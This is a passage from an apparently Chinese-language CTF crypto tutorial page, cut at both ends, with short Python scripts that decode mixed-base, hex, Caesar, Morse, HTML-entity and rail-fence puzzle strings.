b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&#x27;</span></span><br><span class="line">s=text.split()</span><br><span class="line">print(s)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>]==<span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        i=chr(int(i[<span class="number">1</span>:]))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">16</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">2</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">8</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>十六进制准换ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;57656C6C20646F6E653A4A35584759364A414E3558474B4944544F525358414944424F355158534F5352474934584B5752544A4A5547495343574F4E4D56515554514D495A444B3653504E55345755594C4F494933574B334C554F425257323442544D4A4C5451354443474A344847594C4A4746325745563359474E47464F3444574D56445757354445493459584D5953484756345745334A5A47425347324D4C324D5A49543250493D&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">2</span>):</span><br><span class="line">    h=<span class="string">&quot;0x&quot;</span>+steady_str[i:i+<span class="number">2</span>]</span><br><span class="line">    n=int(h,<span class="number">16</span>)</span><br><span class="line">    steady_flag+=chr(n)</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。</p><p>下面我们总结一下：</p><p>明密对照表：</p><p>明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ</p><p>密文：TUVWXYZABCDEFGHIJKLMNOPQRS</p><p>注：广义上的凯撒是位移的。</p><p>凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙。</p><p>暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;&quot;</span></span><br><span class="line">num = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">steady</span>(<span class="params">str=<span class="string">&quot;123&quot;</span>,num=<span class="number">1</span></span>):</span></span><br><span class="line">    l = list(str)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(l):</span><br><span class="line">        <span class="keyword">if</span> l[i]&gt;=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> l[i]&lt;=<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> l[i]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> l[i] &lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            l[i]=chr(ord(<span class="string">&#x27;a&#x27;</span>)+(ord(l[i])+num-ord(<span class="string">&#x27;a&#x27;</span>))%<span class="number">26</span>)</span><br><span class="line">            i =i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> l[i]&gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> l[i] &lt;=<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            l[i]=chr(ord(<span class="string">&#x27;A&#x27;</span>)+(ord(l[i])+num-ord(<span class="string">&#x27;A&#x27;</span>))%<span class="number">26</span>)</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i =i+<span class="number">1</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span>.join(l)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">    steady_str = steady(str1,i)</span><br><span class="line">    print(steady_str)</span><br></pre></td></tr></table></figure><p>每一位的移位数量不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">start=<span class="number">5</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_str)):</span><br><span class="line">    print(steady_str[i])</span><br><span class="line">    flag+=chr(ord(steady_str[i])+start)</span><br><span class="line">    start+=<span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>Task:<br>I guess you are done with Caesar, aren’t you?<br>The big problem with caesar is that it does not allow digits or other characters.<br>I have fixed this, and now I can use any ascii character in the plaintext.<br>The keyspace has increased from 26 to 128 too. \o/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data2&#x3D;&quot;372332333823253030333b23282d2b2d38372333362333382c293623272c25362527382936370d232c253a29232a2d3c292823382c2d37232532282332333b230d23272532233937292325323d232537272d2d23272c25362527382936232d3223382c29233430252d3238293c382a30252b1e0e14073f3d33392336233b2d3241&quot;</span><br><span class="line">for i in range(128):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    for j in range(0,len(data2),2):</span><br><span class="line">        string&#x3D;&quot;0x&quot; + data2[j:j+2]</span><br><span class="line">        inting&#x3D;int(string,16)+i</span><br><span class="line">        if inting &gt; 128:</span><br><span class="line">            flag+&#x3D;chr(inting%128)</span><br><span class="line">        else:</span><br><span class="line">            flag+&#x3D;chr(inting)</span><br><span class="line">    if &quot;ZJPC&quot; in flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h2 id="莫斯密码"><a href="#莫斯密码" class="headerlink" title="莫斯密码"></a>莫斯密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">steady_str1=<span class="string">&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;</span></span><br><span class="line">steady_str2=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_str4=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str1:</span><br><span class="line">    steady_str2+=dict1[i]</span><br><span class="line">print(<span class="string">&quot;莫斯电码为：&quot;</span>+steady_str2)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> steady_str2:</span><br><span class="line">    steady_str3=steady_str2.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;分割莫斯电码：&quot;</span>)</span><br><span class="line">print(steady_str3)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> steady_str3:</span><br><span class="line">    steady_str4+=dict2[z]</span><br><span class="line">print(<span class="string">&quot;flag：&quot;</span>+steady_str4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">steady_str=<span class="string">&quot;o00。o。o0oo。0o0o。000。00。o。0。000。ooo0。o。0o。oo0。ooo。0o0o。0。oo0o&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&#x27;。&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;。&#x27;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">new_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">flag=flag.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(i)</span><br><span class="line">    new_flag+=dict2[i]</span><br><span class="line">print(new_flag)</span><br></pre></td></tr></table></figure><h2 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;&quot;</span></span><br><span class="line">steady_str1=steady_str.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">steady_str3=[]</span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str1:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        steady_str2=i.split(<span class="string">&#x27;&amp;#&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    steady_str3.append(steady_str2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str3:</span><br><span class="line">    steady_flag+=chr(int(i))</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="栏栅密码"><a href="#栏栅密码" class="headerlink" title="栏栅密码"></a>栏栅密码</h2><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fence</span>(<span class="params">lst, numrails</span>):</span></span><br><span class="line">    fence = [[<span class="literal">None</span>] * len(lst) <span class="keyword">for</span> n <span class="keyword">in</span> range(numrails)]</span><br><span class="line">    rails = range(numrails - <span class="number">1</span>) + range(numrails - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> n, x <span class="keyword">in</span> enumerate(lst):</span><br><span class="line">        fence[rails[n % len(rails)]][n] = x</span><br><span class="line">    <span class="keyword">return</span> [c <span class="keyword">for</span> rail <span class="keyword">in</span> fence <span class="keyword">for</span> c <span class="keyword">in</span> rail <span class="keyword">if</span> c <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">text, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(fence(text, n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">text, n</span>):</span></span><br><span class="line">    rng = range(len(text))</span><br><span class="line">    pos = 